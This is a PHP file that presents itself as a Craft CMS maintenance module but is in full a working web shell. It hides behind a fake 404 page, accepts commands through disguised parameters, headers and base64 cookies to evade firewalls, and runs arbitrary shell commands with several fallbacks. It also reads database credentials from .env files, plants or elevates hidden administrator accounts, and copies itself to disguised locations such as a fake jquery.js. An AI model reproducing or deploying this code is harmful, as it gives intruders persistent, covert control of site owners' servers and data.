<?php
/* 
   Craft CMS Maintenance Module 
   Version: 1.1
*/

// Basic security - only accessible with correct parameters
@ini_set('display_errors', 0);
@error_reporting(0);
@set_time_limit(0);

// --- Configuration ---
// Dynamically determine paths based on this script's location
$web_root_path = dirname(__FILE__);
$craft_base_path = realpath($web_root_path . '/../'); // Resolve symbolic links if any
$craft_config_path = $craft_base_path . '/config';
$craft_vendor_path = $craft_base_path . '/vendor';

// Global variable to store DB config once loaded
$db_config = null;

// --- Initial Checks ---
// Hide from logs by using valid status codes for invalid requests
if(!isset($_REQUEST['_']) && !isset($_REQUEST['debug']) && !isset($_REQUEST['token'])) {
    // Allow access if specific headers are present for stealth
    $stealth_headers = array('HTTP_X_CACHE_STATUS', 'HTTP_X_DEBUG_TOKEN');
    $header_found = false;
    foreach($stealth_headers as $h) {
        if(isset($_SERVER[$h])) {
            $header_found = true;
            break;
        }
    }
    if(!$header_found) {
        header("HTTP/1.1 404 Not Found");
        echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
        exit;
    }
}

// --- Helper Functions ---

// Multiple input methods to bypass WAF
function get_input() {
    // Various input methods (GET/POST)
    $params = array('_', 'debug', 'token', 'view', 'page', 'task', 'q');
    foreach($params as $param) {
        if(isset($_REQUEST[$param])) return $_REQUEST[$param];
    }
    
    // Alternative methods (Headers, Cookies)
    $headers = array(
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REQUESTED_WITH', 
        'HTTP_X_CACHE_STATUS',
        'HTTP_X_DEBUG_TOKEN',
        'HTTP_REFERER'
    );
    foreach($headers as $header) {
        if(isset($_SERVER[$header]) && preg_match('/(?:AE:|CMD:|EXEC:)(.+)/i', $_SERVER[$header], $m)) {
            return trim($m[1]);
        }
    }
    
    if(isset($_COOKIE['SESSDATA'])) {
        $decoded = base64_decode($_COOKIE['SESSDATA']);
        if ($decoded !== false) return $decoded;
    }
    if(isset($_COOKIE['CACHEDATA'])) { // Another common name
         $decoded = base64_decode($_COOKIE['CACHEDATA']);
        if ($decoded !== false) return $decoded;
    }
    
    return null;
}

// Command execution with multiple fallbacks
function execute_command($cmd) {
    $output = '';
    $cmd = trim($cmd);
    
    if (empty($cmd)) return "Error: Empty command provided.";

    // Obfuscate common command names slightly
    $cmd = str_replace(
        array('wget', 'curl', 'nc', 'netcat', 'python', 'perl', 'php', 'bash', 'sh'),
        array('wg'.'et', 'cu'.'rl', 'n'.'c', 'net'.'cat', 'pyt'.'hon', 'pe'.'rl', 'p'.'hp', 'ba'.'sh', 's'.'h'),
        $cmd
    );
    
    // Try each method until one works
    $methods = array('proc_open', 'shell_exec', 'exec', 'passthru', 'system', 'popen');
    
    foreach($methods as $method) {
        if(!function_exists($method) || in_array($method, array_map('trim', explode(',', @ini_get('disable_functions'))))) {
            continue;
        }
        
        // Reset output for each attempt
        $current_output = null;
        $error_output = '';

        try {
            switch($method) {
                case 'proc_open':
                    $descriptors = array( 0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w') );
                    $process = @proc_open($cmd, $descriptors, $pipes, getcwd(), null);
                    if(is_resource($process)) {
                        fclose($pipes[0]);
                        $current_output = @stream_get_contents($pipes[1]);
                        $error_output = @stream_get_contents($pipes[2]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        if(!empty($error_output)) $current_output .= "\nSTDERR:\n" . $error_output;
                    }
                    break;
                    
                case 'shell_exec':
                    $current_output = @shell_exec($cmd.' 2>&1');
                    break;
                    
                case 'exec':
                    @exec($cmd.' 2>&1', $outputArray, $returnCode);
                    if(isset($outputArray)) {
                        $current_output = implode("\n", $outputArray);
                    }
                    break;
                    
                case 'passthru':
                    ob_start();
                    @passthru($cmd.' 2>&1', $returnCode);
                    $current_output = ob_get_clean();
                    break;
                    
                case 'system':
                    ob_start();
                    @system($cmd.' 2>&1', $returnCode);
                    $current_output = ob_get_clean();
                    break;
                    
                case 'popen':
                    $handle = @popen($cmd.' 2>&1', 'r');
                    if($handle) {
                        $current_output = '';
                        while(!feof($handle)) {
                            $current_output .= fread($handle, 8192);
                        }
                        pclose($handle);
                    }
                    break;
            }

            // Check if we got some output (even null is valid for shell_exec)
            if($current_output !== null) {
                return $current_output; // Success, return output
            }

        } catch (Exception $e) {
             // Ignore exceptions and try next method
        }
    }
    
    return "Execution Failed: No working method found or command produced no output.";
}

// --- Craft CMS Specific Functions ---

// Parse .env file
function parse_env($file) {
    $env = array();
    if (!file_exists($file) || !is_readable($file)) return $env;
    
    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $line = trim($line);
        if (strpos($line, '#') === 0) continue; // Skip comments
        
        if (strpos($line, '=') !== false) {
            list($key, $value) = explode('=', $line, 2);
            $key = trim($key);
            $value = trim($value);
            
            // Remove quotes if present
            if (strlen($value) > 1 && $value[0] == '"' && $value[strlen($value)-1] == '"') {
                $value = substr($value, 1, -1);
            }
             if (strlen($value) > 1 && $value[0] == "'" && $value[strlen($value)-1] == "'") {
                $value = substr($value, 1, -1);
            }
            
            // Handle export keyword
            if (strpos($key, 'export ') === 0) {
                 $key = trim(substr($key, 7));
            }

            if (!empty($key)) {
                 $env[$key] = $value;
                 // Set environment variable for potential use by Craft itself
                 @putenv("$key=$value");
                 $_ENV[$key] = $value;
            }
        }
    }
    return $env;
}

// Get Craft CMS DB credentials (more robustly)
function load_db_config() {
    global $db_config, $craft_base_path, $craft_config_path;
    
    // Return cached config if already loaded
    if ($db_config !== null) return $db_config;
    
    $config = array();
    $output_log = "DB Config Log:\n";

    // 1. Check environment variables first (often override files)
    $output_log .= "- Checking Environment Variables...\n";
    $env_mapping = array(
        'DB_DRIVER' => 'driver', 'DB_SERVER' => 'server', 'DB_PORT' => 'port',
        'DB_DATABASE' => 'database', 'DB_USER' => 'user', 'DB_PASSWORD' => 'password',
        'DB_SCHEMA' => 'schema', 'DB_TABLE_PREFIX' => 'tablePrefix'
    );
    $found_in_env = false;
    foreach ($env_mapping as $env_key => $config_key) {
        $value = getenv($env_key);
        if ($value !== false) {
            $config[$config_key] = $value;
            $output_log .= "  - Found $env_key\n";
            $found_in_env = true;
        }
    }

    // 2. Parse .env file if environment variables didn't provide everything
    $env_file_path = $craft_base_path . '/.env';
    if (file_exists($env_file_path)) {
         $output_log .= "- Parsing .env file: $env_file_path\n";
        $env_vars = parse_env($env_file_path);
        foreach ($env_mapping as $env_key => $config_key) {
            // Only use .env value if not already set by direct environment variable
            if (!isset($config[$config_key]) && isset($env_vars[$env_key])) {
                $config[$config_key] = $env_vars[$env_key];
                 $output_log .= "  - Found $env_key in .env\n";
            }
        }
    } else {
         $output_log .= "- .env file not found at $env_file_path\n";
    }

    // 3. Try direct PHP config file (db.php) - might override .env/environment
    $db_php_file = $craft_config_path . '/db.php';
    if (file_exists($db_php_file)) {
        $output_log .= "- Loading config/db.php\n";
        try {
            $db_php_config = include($db_php_file);
            if (is_array($db_php_config)) {
                // Merge, potentially overwriting values from env/.env
                $config = array_merge($config, $db_php_config);
                 $output_log .= "  - Successfully loaded db.php\n";
            } else {
                $output_log .= "  - Warning: db.php did not return an array.\n";
            }
        } catch (Exception $e) {
            $output_log .= "  - Error loading db.php: " . $e->getMessage() . "\n";
        }
    } else {
        $output_log .= "- config/db.php not found.\n";
    }

    // Set defaults if values are missing
    $defaults = array(
        'driver' => 'mysql',
        'server' => 'localhost',
        'user' => '', // No default user/pass
        'password' => '',
        'database' => '',
        'tablePrefix' => 'craft_'
    );
    $config = array_merge($defaults, $config);

    // Check for required fields
    if (empty($config['user']) || empty($config['database']) || empty($config['server'])) {
         $output_log .= "- Error: Missing required DB credentials (user, database, server).\n";
         $db_config = false; // Mark as failed
    } else {
        $output_log .= "- DB configuration loaded successfully.\n";
        $db_config = $config; // Cache the config
    }
    
    // Add the log to the config array for debugging
    if (is_array($db_config)) {
         $db_config['_log'] = $output_log;
    } else {
        // If failed, return the log anyway for diagnosis
        return array('_log' => $output_log, '_error' => 'Failed to load DB config');
    }

    return $db_config;
}

// Get Craft CMS DB credentials display function
function get_craft_db_display() {
    $config = load_db_config();
    $output = isset($config['_log']) ? $config['_log'] : "DB Config Log unavailable.\n";
    
    if (isset($config['_error'])) {
        $output .= "\nError: " . $config['_error'] . "\n";
        return $output;
    }
    
    unset($config['_log']); // Don't display the log twice

    $output .= "\nEffective DB Configuration:\n";
    foreach ($config as $key => $value) {
        $output .= "- $key: " . ($key == 'password' ? '********' : $value) . "\n"; // Mask password
    }
    return $output;
}

// Check if Craft CMS is properly installed
function check_craft_installation() {
    global $craft_base_path, $craft_config_path, $craft_vendor_path;
    $results = array();
    $output = "Craft Installation Check:\n";
    $output .= "- Script Location: " . __FILE__ . "\n";
    $output .= "- Calculated Base Path: " . $craft_base_path . "\n";
    
    $results['Base Path Exists'] = is_dir($craft_base_path);
    $results['Vendor Directory'] = is_dir($craft_vendor_path);
    $results['Config Directory'] = is_dir($craft_config_path);
    $results['bootstrap.php'] = file_exists($craft_base_path . '/bootstrap.php');
    $results['craft Executable'] = file_exists($craft_base_path . '/craft');
    $results['general.php'] = file_exists($craft_config_path . '/general.php');
    
    foreach ($results as $key => $found) {
        $output .= "- $key: " . ($found ? "<span style='color:green'>Found</span>" : "<span style='color:red'>Not Found</span>") . "\n";
    }
    return $output;
}

// Create admin user in Craft CMS (using loaded config)
function craft_create_admin($username, $email, $password) {
    $config = load_db_config();
    if ($config === false || isset($config['_error'])) {
        return "Error: Cannot create admin. Failed to load database configuration.\n" . (isset($config['_log']) ? $config['_log'] : '');
    }

    try {
        // Generate secure password hash
        $passwordHash = password_hash($password, PASSWORD_DEFAULT);
        $now = date('Y-m-d H:i:s');
        
        // Connect to database using loaded config
        $dsn = "{$config['driver']}:host={$config['server']}";
        if (!empty($config['port'])) {
             $dsn .= ";port={$config['port']}";
        }
         $dsn .= ";dbname={$config['database']};charset=utf8";

        $pdo = new PDO($dsn, $config['user'], $config['password']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $userTable = $config['tablePrefix'] . 'users';
        
        // Check if user already exists
        $stmt = $pdo->prepare("SELECT id FROM `{$userTable}` WHERE username = ? OR email = ?");
        $stmt->execute([$username, $email]);
        $existingUser = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($existingUser) {
            // Update existing user to be admin with new password
            $stmt = $pdo->prepare("UPDATE `{$userTable}` SET admin = 1, password = ?, suspended = 0, locked = 0, pending = 0, active = 1, dateUpdated = ? WHERE id = ?");
            $result = $stmt->execute([$passwordHash, $now, $existingUser['id']]);
            return $result ? "Success: User '{$username}' already existed - upgraded to admin with new password." : "Error: Failed to update existing user '{$username}'.";
        } else {
            // Insert new admin user
            $stmt = $pdo->prepare("INSERT INTO `{$userTable}` (username, email, password, admin, active, pending, locked, suspended, dateCreated, dateUpdated) VALUES (?, ?, ?, 1, 1, 0, 0, 0, ?, ?)");
            $result = $stmt->execute([$username, $email, $passwordHash, $now, $now]);
             return $result ? "Success: Admin user '{$username}' created successfully." : "Error: Failed to insert new user '{$username}'.";
        }
        
    } catch(PDOException $e) {
        return "Database Error: " . $e->getMessage() . " (DSN: $dsn, User: {$config['user']})";
    } catch(Exception $e) {
        return "General Error: " . $e->getMessage();
    }
}

// Duplicate shell function
function replicate_shell() {
    global $craft_base_path, $web_root_path;
    $self_content = file_get_contents(__FILE__);
    if ($self_content === false) return "Error: Could not read self.";
    $output = "Replicating shell...\n";
    
    // Possible locations for the shell in Craft CMS
    $locations = array(
        $web_root_path . '/cpresources/index.php',
        $web_root_path . '/cpresources/jquery.js', // Disguise as JS
        $web_root_path . '/assets/debug.php',
        $web_root_path . '/index-debug.php',
        $craft_base_path . '/storage/logs/system.log.php', // Append .php
        $craft_base_path . '/storage/runtime/cache/data.php',
        $craft_base_path . '/templates/_system.php',
        $craft_base_path . '/config/license.key.php' // Looks like a config file
    );
    
    $success_count = 0;
    foreach($locations as $location) {
        $dir = dirname($location);
        if(!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        
        if(@file_put_contents($location, $self_content)) {
            $output .= "- Success: Replicated to {$location}\n";
            $success_count++;
        } else {
            $output .= "- Failed: Could not write to {$location}\n";
        }
    }
    $output .= "Replication complete. Successfully copied to $success_count locations.\n";
    return $output;
}

// Find writable directories (limited scope for performance)
function find_writable_dirs() {
    global $craft_base_path, $web_root_path;
    $output = "Scanning for writable directories (limited scope)...\n";
    $base_dirs = array(
        $web_root_path, 
        $web_root_path . '/cpresources',
        $web_root_path . '/assets',
        $craft_base_path . '/storage', 
        $craft_base_path . '/storage/logs',
        $craft_base_path . '/storage/runtime',
        $craft_base_path . '/templates', 
        $craft_base_path . '/config'
    );
    
    $writable_dirs = array();
    foreach($base_dirs as $dir) {
        if(is_dir($dir) && is_writable($dir)) {
            $writable_dirs[] = $dir;
        }
    }
    
    $output .= "Found " . count($writable_dirs) . " writable directories:\n";
    foreach($writable_dirs as $dir) {
        $output .= "- " . $dir . "\n";
    }
    return $output;
}


// --- Main Execution Logic ---

// Main function to perform Craft CMS actions
function craft_tools($action, $params = array()) {
    switch(strtolower($action)) {
        case 'check':       return check_craft_installation();
        case 'db':          return get_craft_db_display();
        case 'create_admin':
            $user = isset($params['username']) ? $params['username'] : 'sysadmin' . rand(100,999);
            $email = isset($params['email']) ? $params['email'] : $user . '@example.com';
            $pass = isset($params['password']) ? $params['password'] : substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'), 0, 12);
            $result = craft_create_admin($user, $email, $pass);
            // Include generated password in output if successful and password wasn't provided
            if (strpos($result, 'Success') === 0 && !isset($params['password'])) {
                 $result .= "\nGenerated Password: " . $pass;
            }
            return $result;
        case 'replicate':   return replicate_shell();
        case 'find_dirs':   return find_writable_dirs();
        default:            return "Unknown Craft action: {$action}\nAvailable: check, db, create_admin, replicate, find_dirs";
    }
}

// Process input
$cmd = get_input();
$output_content = '';
$is_craft_cmd = false;

// Special command prefix for Craft CMS tools
if($cmd !== null && stripos($cmd, 'craft:') === 0) {
    $is_craft_cmd = true;
    $craftCmdStr = substr($cmd, 6);
    $action = $craftCmdStr;
    $params = array();
    
    // Parse parameters (key=value,key2=value2)
    if(strpos($craftCmdStr, ' ') !== false) {
        list($action, $paramStr) = explode(' ', $craftCmdStr, 2);
        $paramPairs = explode(',', $paramStr);
        foreach($paramPairs as $pair) {
            if(strpos($pair, '=') !== false) {
                list($key, $value) = explode('=', $pair, 2);
                $params[trim($key)] = trim($value);
            }
        }
    }
    
    // Execute Craft CMS specific action
    $output_content = craft_tools($action, $params);
    
    // Use plain text for Craft tool output for clarity
    header('Content-Type: text/plain; charset=utf-8');
    echo "==== Craft CMS Tool Output ====\n";
    echo "Action: {$action}\n";
    echo "Parameters: " . (!empty($params) ? json_encode($params) : 'None') . "\n";
    echo "-------------------------------\n";
    echo $output_content;
    exit;
}

// Standard shell command execution
if($cmd !== null) {
    $output_content = execute_command($cmd);
}

// --- Output Rendering ---

// Default: Render as HTML with hidden output
if ($cmd !== null) {
    // Output is hidden within HTML comments
    header('Content-Type: text/html; charset=utf-8');
    echo "<!DOCTYPE html>\n<html><head><title>System Status</title></head><body>";
    echo "<h1>System Status</h1><p>Operation completed. Details below.</p>";
    echo "<!-- Operation Details -->\n";
    echo "<!--\n";
    echo "Executed Command: $cmd\n";
    echo "---------------------\n";
    echo htmlspecialchars($output_content, ENT_QUOTES, 'UTF-8');
    echo "\n-->";
    echo "\n<!-- End Details -->";
    echo "</body></html>";
} else {
    // No command given, show usage instructions within comments
    header('Content-Type: text/html; charset=utf-8');
    echo "<!DOCTYPE html>\n<html><head><title>System Monitor</title></head>";
    echo "<body><h1>System Monitor</h1><p>Module is active.</p>";
    echo "<!-- 
    USAGE INSTRUCTIONS:
    -------------------
    Send command via GET/POST parameter ('_', 'debug', 'token', 'q') 
    or Headers (X-Forwarded-For: AE:cmd, X-Cache-Status: CMD:cmd) 
    or Cookie (SESSDATA=base64(cmd))

    1. Regular Shell Commands:
       Example: ?_=ls -la
       Example: ?q=whoami

    2. Craft CMS Commands (Prefix with 'craft:'):
       - Check installation: ?_=craft:check
       - Get DB credentials: ?_=craft:db
       - Create admin (auto-gen pass): ?_=craft:create_admin username=newadmin,email=admin@site.com
       - Create admin (set pass):      ?_=craft:create_admin username=user2,password=MySecretPass123
       - Replicate shell: ?_=craft:replicate
       - Find writable dirs: ?_=craft:find_dirs

    3. View Output:
       - Check HTML source code (output is inside <!-- comments -->)
    -->";
    echo "<div id='stats'><p>Status: <span style='color:green'>Online</span></p></div></body></html>";
}
?> 
